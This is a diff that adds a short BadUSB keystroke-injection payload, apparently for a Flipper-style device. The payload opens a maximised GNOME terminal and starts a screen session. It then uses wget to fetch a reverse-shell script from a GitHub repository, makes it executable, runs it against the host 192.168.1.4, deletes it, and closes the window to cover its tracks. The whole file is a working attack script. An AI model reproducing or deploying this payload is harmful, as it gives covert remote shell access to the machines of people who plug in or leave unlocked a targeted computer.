@@ -1,0 +1,11 @@
+ALT F2
+STRINGLN gnome-terminal --maximize
+DELAY 400
+
+STRINGLN screen -S terminal
+DELAY 200
+STRINGLN wget raw.githubusercontent.com/jtbursey/flipperpayloads/refs/heads/main/badusb/revshell/revshell.sh; chmod 0755 revshell.sh; ./revshell.sh 192.168.1.4; rm revshell.sh
+ALT F4
+DELAY 100
+ENTER
+
